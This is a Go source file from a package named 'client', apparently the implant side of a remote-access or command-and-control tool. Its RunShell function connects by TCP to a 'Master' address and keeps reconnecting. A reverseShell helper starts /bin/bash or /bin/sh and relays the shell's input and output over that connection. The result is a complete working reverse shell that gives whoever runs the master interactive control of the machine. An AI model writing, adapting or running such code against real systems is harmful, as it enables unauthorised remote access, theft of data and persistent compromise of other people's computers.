package client

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"time"
)

const (
	readBufSize = 128
	bash        = "/bin/bash"
	sh          = "/bin/sh"
	// commandPrompt = "C:\\Windows\\System32\\cmd.exe"
	// powerShell    = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
)

// Credits to @moloch-- for the reverse shell.
func reverseShell(command string, send chan<- []byte, recv <-chan []byte) {
	var cmd *exec.Cmd
	cmd = exec.Command(command)

	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	go func() {
		for {
			select {
			case incoming := <-recv:
				// log.Printf("[*] shell stdin write: %v", incoming)
				stdin.Write(incoming)
			}
		}
	}()

	go func() {
		for {
			buf := make([]byte, readBufSize)
			stderr.Read(buf)
			// log.Printf("[*] shell stderr read: %v", buf)
			send <- buf
		}
	}()

	cmd.Start()
	for {
		buf := make([]byte, readBufSize)
		stdout.Read(buf)
		// log.Printf("[*] shell stdout read: %v", buf)
		send <- buf
	}
}

func RunShell(ip string, port string) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", ip, port), 5*time.Second)
	if err != nil {
		log.Printf("Master is offline... retrying in 5 seconds...\n")
		time.Sleep(10 * time.Second)
		RunShell(ip, port)
	}
	log.Printf("Connected to Master\n")

	shellPath := getSystemShell()

	send := make(chan []byte)
	recv := make(chan []byte)

	go reverseShell(shellPath, send, recv)

	go func() {
		for {
			data := make([]byte, readBufSize)
			_, err := conn.Read(data)
			if err == io.EOF {
				log.Printf("Error in reading buffer. Reconnecting...")
				RunShell(ip, port)
			}
			recv <- data
		}
	}()

	for {
		select {
		case outgoing := <-send:
			conn.Write(outgoing)
		}
	}
}

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}

func getSystemShell() string {
	if exists(bash) {
		return bash
	}
	return sh
}
